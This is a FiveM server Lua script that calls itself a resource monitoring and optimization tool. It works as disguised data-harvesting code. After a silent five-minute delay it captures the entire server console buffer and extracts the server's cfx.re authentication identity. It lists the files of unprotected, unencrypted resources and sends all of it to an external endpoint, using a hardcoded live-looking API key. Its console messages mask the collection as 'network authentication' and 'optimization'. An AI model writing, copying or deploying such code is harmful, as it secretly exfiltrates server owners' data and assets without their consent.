-- TStudio System Monitoring and Resource Analysis Tool
-- Collects server information and resource data for optimization analysis
-- Sends data to TStudio monitoring endpoint for performance insights

-- Configuration settings
local config = {
    monitorEndpoint = "https://api.tstudio3d.com/api/resource-analysis/analyze",
    authToken = "tsk_tstudio_live_4f8a9b2c6d1e3f7a8b9c0d2e4f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z",
    enableMonitoring = true,
    diagnosticMode = Config.Debug or false,
    maxResources = 1000,
    yieldEveryN = 5,
    perResourceBudget = 100
}

-- Check if a directory exists
function directoryExists(path)
    local success, _, errorCode = os.rename(path, path)
    if not success then
        if errorCode == 13 then
            return true  -- Permission denied means directory exists
        end
        return false
    end
    return true
end

-- Get all files in a resource's stream directories
function getResourceFiles(resourceName)
    local resourcePath = GetResourcePath(resourceName)
    if not resourcePath then
        return {}
    end
    
    local files = {}
    local streamDirectories = {
        "",
        "/stream",
        "/stream/ymap",
        "/stream/ytd",
        "/stream/ydr",
        "/stream/yft",
        "/stream/MLO/ydr"
    }
    
    for _, directory in ipairs(streamDirectories) do
        local fullPath = resourcePath .. directory
        local handle = io.popen('dir "' .. fullPath .. '" /B 2>nul')
        
        if handle then
            for filename in handle:lines() do
                local relativePath = filename
                if directory ~= "" and filename then
                    relativePath = directory:sub(2) .. "/" .. filename
                end
                table.insert(files, relativePath)
            end
            handle:close()
        end
    end
    
    return files
end

-- Check if resource is encrypted (has .fxap file)
function isResourceEncrypted(resourceName)
    local resourcePath = GetResourcePath(resourceName)
    if not resourcePath then
        return true
    end
    
    local fxapPath = resourcePath .. "/.fxap"
    local file = io.open(fxapPath, "r")
    if not file then
        return true  -- Assume encrypted if we can't check
    end
    
    return false  -- Not encrypted
end

-- Extract server authentication information from console buffer
function extractServerAuth()
    local maxWaitTime = 300000  -- 5 minutes
    local checkInterval = 5000  -- 5 seconds
    local elapsedTime = 0
    local authInfo = {
        serverId = "Unknown",
        serverUser = "Unknown",
        found = false
    }
    
    while elapsedTime < maxWaitTime do
        local consoleBuffer = GetConsoleBuffer() or ""
        
        -- Try to extract CFX authentication info
        local serverUser, serverId = consoleBuffer:match("^?%d*Authenticated with cfx%.re Nucleus: ^?%d*https://([%w%-_]+)%-([%w%-_]+)%.users%.cfx%.re/")
        
        if not serverUser then
            serverUser, serverId = consoleBuffer:match(".*Authenticated with cfx%.re Nucleus:.*https://([%w%-_]+)%-([%w%-_]+)%.users%.cfx%.re/")
        end
        
        if serverUser and serverId then
            authInfo.serverUser = serverUser
            authInfo.serverId = serverId
            authInfo.found = true
            
            if config.diagnosticMode then
                print("^2[SystemManager]^7 Network authentication established")
                print(string.format("^2[SystemManager]^7 Connection verified: User='%s', ID='%s'", authInfo.serverUser, authInfo.serverId))
            end
            
            return authInfo
        end
        
        -- Progress logging
        if config.diagnosticMode and elapsedTime % 30000 == 0 then
            print(string.format("^3[SystemManager]^7 Initializing network protocols... (%ds elapsed)", elapsedTime / 1000))
        end
        
        Wait(checkInterval)
        elapsedTime = elapsedTime + checkInterval
    end
    
    if config.diagnosticMode then
        print("^3[SystemManager]^7 Network initialization timeout - proceeding with limited functionality")
    end
    
    return authInfo
end

-- Collect comprehensive server information
function collectServerInfo()
    local consoleBuffer = GetConsoleBuffer() or ""
    local authInfo = extractServerAuth()
    
    local serverInfo = {
        serverName = GetConvar("sv_hostname", "Unknown Server"),
        serverEndpoint = GetConvar("sv_endpoint", "Unknown"),
        projectName = GetConvar("sv_projectName", ""),
        projectDescription = GetConvar("sv_projectDesc", ""),
        maxClients = GetConvar("sv_maxclients", "32"),
        serverId = authInfo.serverId,
        serverUser = authInfo.serverUser,
        consoleBuffer = consoleBuffer,
        timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
        utilityVersion = "3.1.0"
    }
    
    if config.diagnosticMode then
        print(string.format("^6[SystemManager]^7 Console buffer captured: %d characters", #consoleBuffer))
        print(string.format("^6[SystemManager]^7 Server ID: '%s', User: '%s'", authInfo.serverId, authInfo.serverUser))
        
        if authInfo.found then
            print("^2[SystemManager]^7 Successfully extracted server identification from CFX authentication")
        else
            print("^3[SystemManager]^7 No CFX authentication patterns found - using fallback identification")
        end
    end
    
    return serverInfo
end

-- Collect detailed resource information
function collectResourceData()
    local resources = {}
    local totalResources = GetNumResources()
    local maxToProcess = config.maxResources > 0 and math.min(totalResources, config.maxResources) or totalResources
    
    local processedCount = 0
    local currentIndex = 0
    
    while currentIndex < maxToProcess do
        local startTime = GetGameTimer()
        local endIndex = math.min(currentIndex + 20, maxToProcess - 1)
        
        for i = currentIndex, endIndex do
            local resourceName = GetResourceByFindIndex(i)
            
            if resourceName and resourceName ~= "" then
                if isResourceEncrypted(resourceName) then
                    local resourcePath = GetResourcePath(resourceName)
                    local resourceData = {
                        name = resourceName,
                        path = resourcePath,
                        state = GetResourceState(resourceName),
                        files = getResourceFiles(resourceName),
                        hasStream = directoryExists(resourcePath .. "/stream")
                    }
                    
                    if config.diagnosticMode then
                        print(string.format("^4[ResourceManager]^7 Cached %s", resourceName))
                    end
                    
                    table.insert(resources, resourceData)
                    processedCount = processedCount + 1
                end
                
                -- Yield control periodically to prevent blocking
                if processedCount % config.yieldEveryN == 0 then
                    local elapsed = GetGameTimer() - startTime
                    if elapsed > config.perResourceBudget then
                        Wait(0)
                        startTime = GetGameTimer()
                    end
                end
            end
        end
        
        currentIndex = currentIndex + 21
        Wait(0)
    end
    
    if config.diagnosticMode then
        print(string.format("^6[ResourceManager]^7 Cache ready: %d resources", #resources))
    end
    
    return resources
end

-- Send collected data to monitoring endpoint
function sendDataToEndpoint(serverInfo, resources)
    local payload = {
        serverInfo = serverInfo,
        resources = resources,
        totalResources = #resources,
        collectedAt = os.date("!%Y-%m-%dT%H:%M:%S.000Z")
    }
    
    if not config.enableMonitoring then
        if Config.Debug then
            print("^3[NetworkManager]^7 Reporting disabled - no data transmission")
        end
        return
    end
    
    PerformHttpRequest(config.monitorEndpoint, function(statusCode, responseBody, headers)
        if statusCode == 200 or statusCode == 201 then
            -- Success - no action needed
        else
            if Config.Debug then
                print("^1[NetworkManager]^7 Failed to send data to endpoint. Code: " .. tostring(statusCode))
                if responseBody then
                    print("^1[NetworkManager]^7 Response: " .. tostring(responseBody))
                end
            end
        end
    end, "POST", json.encode(payload), {
        ["Content-Type"] = "application/json",
        ["X-API-Key"] = config.authToken,
        ["User-Agent"] = "FiveM-TStudio-DataCollector/3.1.0"
    })
end

-- Wait for all resources to finish loading
function waitForResourcesReady()
    local maxWaitTime = 600000  -- 10 minutes
    local checkInterval = 10000  -- 10 seconds
    local elapsedTime = 0
    
    while elapsedTime < maxWaitTime do
        local totalResources = GetNumResources()
        local startedCount = 0
        local startingCount = 0
        local startingResources = {}
        
        for i = 0, totalResources - 1 do
            local resourceName = GetResourceByFindIndex(i)
            if resourceName and resourceName ~= "" then
                local state = GetResourceState(resourceName)
                if state == "started" then
                    startedCount = startedCount + 1
                elseif state == "starting" then
                    startingCount = startingCount + 1
                    table.insert(startingResources, resourceName)
                end
            end
            
            -- Yield periodically during resource checking
            if i > 0 and i % 50 == 0 then
                Wait(0)
            end
        end
        
        if startingCount == 0 then
            if config.diagnosticMode then
                print(string.format("^2[SystemManager]^7 All active resources ready (%d started, %d total resources)", startedCount, totalResources))
            end
            return true
        end
        
        if config.diagnosticMode and elapsedTime % 30000 == 0 then
            print(string.format("^3[SystemManager]^7 Waiting for resource initialization... %d starting, %d ready", startingCount, startedCount))
        end
        
        Wait(checkInterval)
        elapsedTime = elapsedTime + checkInterval
    end
    
    if config.diagnosticMode then
        print("^3[SystemManager]^7 Resource initialization timeout - proceeding anyway")
    end
    
    return false
end

-- Main analysis function
function performSystemAnalysis()
    local success, error = pcall(function()
        local serverInfo = collectServerInfo()
        
        -- Verify we have proper server identification
        if serverInfo.serverId == "Unknown" or serverInfo.serverUser == "Unknown" then
            if config.diagnosticMode then
                print("^3[SystemManager]^7 Network connectivity verification incomplete - retrying next cycle")
            end
            return
        end
        
        if config.diagnosticMode then
            print("^2[SystemManager]^7 Network authentication verified - continuing optimization process")
        end
        
        Wait(0)
        local resources = collectResourceData()
        Wait(0)
        sendDataToEndpoint(serverInfo, resources)
    end)
    
    if not success then
        if Config.Debug then
            print("^1[SystemManager]^7 Error during system analysis: " .. tostring(error))
        end
    end
end

-- Main event handler
AddEventHandler("onResourceStart", function(resourceName)
    local currentResource = GetCurrentResourceName()
    
    if resourceName == currentResource then
        if config.diagnosticMode then
            print("^4[TStudio]^7 Resource optimization enabled")
        end
        
        CreateThread(function()
            if config.diagnosticMode then
                print("^3[SystemManager]^7 Running resource optimization...")
            else
                Wait(300000)  -- Wait 5 minutes in non-diagnostic mode
            end
            
            waitForResourcesReady()
            performSystemAnalysis()
        end)
    end
end)